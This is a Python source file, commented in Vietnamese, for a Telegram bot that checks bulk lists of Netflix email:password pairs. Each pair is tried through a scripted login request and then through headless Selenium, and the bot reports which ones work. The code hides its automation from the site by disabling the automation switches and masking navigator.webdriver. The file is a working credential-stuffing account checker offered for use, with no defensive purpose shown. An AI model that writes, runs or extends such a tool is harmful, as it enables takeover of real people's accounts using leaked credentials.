import os
import re
import time
import logging
import asyncio
import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.chrome.options import Options
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Cấu hình logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', 
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ================== CẤU HÌNH ==================
BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    logger.error("BOT_TOKEN chưa được đặt trong biến môi trường!")
    exit(1)

NETFLIX_LOGIN_URL = "https://www.netflix.com/vn/login"
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

# ================== HÀM KIỂM TRA BẰNG REQUESTS ==================
def check_with_requests(email: str, password: str) -> bool:
    """
    Thử đăng nhập bằng requests.
    Trả về True nếu đăng nhập thành công, False nếu thất bại hoặc cần fallback.
    """
    session = requests.Session()
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://www.netflix.com",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }

    try:
        # 1. Lấy trang login để lấy CSRF token (nếu có)
        resp = session.get(NETFLIX_LOGIN_URL, headers=headers, timeout=10)
        if resp.status_code != 200:
            logger.warning(f"[Requests] Không thể truy cập trang login: {resp.status_code}")
            return False

        # Tìm token trong HTML (input hidden name="csrf_token")
        match = re.search(r'name="csrf_token"\s+value="([^"]+)"', resp.text)
        csrf_token = match.group(1) if match else ""

        # 2. Gửi POST đăng nhập
        login_payload = {
            "userLoginId": email,
            "password": password,
            "csrf_token": csrf_token,
            "rememberMe": "true",
            "flow": "websiteSignup",
            "mode": "login",
            "action": "loginAction",
        }
        login_resp = session.post(
            NETFLIX_LOGIN_URL,
            data=login_payload,
            headers=headers,
            timeout=10,
            allow_redirects=False
        )

        # Nếu server trả về 302 (redirect) -> có thể đăng nhập thành công
        if login_resp.status_code == 302 and "Set-Cookie" in login_resp.headers:
            # Thử truy cập trang browse để xác nhận
            browse_resp = session.get(
                "https://www.netflix.com/browse", 
                headers=headers, 
                timeout=10, 
                allow_redirects=False
            )
            if browse_resp.status_code == 200 and "browse" in browse_resp.url:
                logger.info(f"[Requests] Thành công: {email}")
                return True
        return False
    except Exception as e:
        logger.warning(f"[Requests] Lỗi: {e}")
        return False  # Fallback sang Selenium

# ================== HÀM KIỂM TRA BẰNG SELENIUM ==================
def check_with_selenium(email: str, password: str) -> bool:
    """
    Dùng Selenium mở trình duyệt, đăng nhập và kiểm tra.
    Trả về True nếu thành công, False nếu sai thông tin.
    """
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--window-size=1920,1080")
    chrome_options.add_argument(f"user-agent={USER_AGENT}")
    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
    chrome_options.add_experimental_option('useAutomationExtension', False)

    driver = webdriver.Chrome(
        service=Service(ChromeDriverManager().install()),
        options=chrome_options
    )
    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")

    try:
        logger.info(f"[Selenium] Đang kiểm tra {email}")
        driver.get(NETFLIX_LOGIN_URL)
        wait = WebDriverWait(driver, 10)

        # Nhập email
        email_input = wait.until(EC.presence_of_element_located((By.NAME, "userLoginId")))
        email_input.clear()
        email_input.send_keys(email)

        # Nhập password
        pass_input = driver.find_element(By.NAME, "password")
        pass_input.clear()
        pass_input.send_keys(password)

        # Click nút đăng nhập
        login_button = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
        login_button.click()

        # Đợi chuyển hướng (có thể lâu hơn nếu mạng chậm)
        time.sleep(8)  # tăng từ 5 lên 8 giây

        # Kiểm tra URL hiện tại
        current_url = driver.current_url
        page_source = driver.page_source.lower()

        if "browse" in current_url or "profiles" in current_url:
            logger.info(f"[Selenium] Thành công: {email}")
            return True
        elif "incorrect password" in page_source or "không tìm thấy tài khoản" in page_source:
            logger.info(f"[Selenium] Sai thông tin: {email}")
            return False
        else:
            logger.warning(f"[Selenium] Không xác định được kết quả cho {email}")
            return False
    except Exception as e:
        logger.error(f"[Selenium] Lỗi khi kiểm tra {email}: {e}")
        return False
    finally:
        driver.quit()

# ================== HÀM KIỂM TRA TỔNG HỢP ==================
async def check_account(email: str, password: str) -> str:
    """
    Kiểm tra một tài khoản: thử requests trước, nếu thất bại thì dùng Selenium.
    Trả về chuỗi kết quả.
    """
    logger.info(f"Đang kiểm tra: {email}")
    # Thử requests
    if check_with_requests(email, password):
        return f"✅ {email}:{password} | Hợp lệ (requests)"
    else:
        # Fallback Selenium
        if check_with_selenium(email, password):
            return f"✅ {email}:{password} | Hợp lệ (selenium)"
        else:
            return f"❌ {email}:{password} | Không hợp lệ"

# ================== XỬ LÝ TELEGRAM BOT ==================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Chào bạn! Gửi mình danh sách tài khoản Netflix theo định dạng:\n"
        "email1:password1\nemail2:password2\n...\n"
        "Mình sẽ kiểm tra và báo kết quả."
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if not text:
        await update.message.reply_text("Vui lòng gửi danh sách tài khoản.")
        return

    lines = text.splitlines()
    accounts = []
    for line in lines:
        line = line.strip()
        if ':' in line:
            email, password = line.split(':', 1)
            accounts.append((email.strip(), password.strip()))
        else:
            await update.message.reply_text(f"Dòng không đúng định dạng (thiếu dấu :): {line}")

    if not accounts:
        await update.message.reply_text("Không tìm thấy tài khoản hợp lệ nào.")
        return

    await update.message.reply_text(f"🔍 Đang kiểm tra {len(accounts)} tài khoản, vui lòng đợi...")

    for email, password in accounts:
        result = await check_account(email, password)
        await update.message.reply_text(result)
        await asyncio.sleep(1)  # Tránh spam

    await update.message.reply_text(f"✅ Hoàn thành! Đã kiểm tra {len(accounts)} tài khoản.")

def main():
    """Khởi chạy bot."""
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    logger.info("Bot đang chạy...")
    application.run_polling()

if __name__ == "__main__":
    main()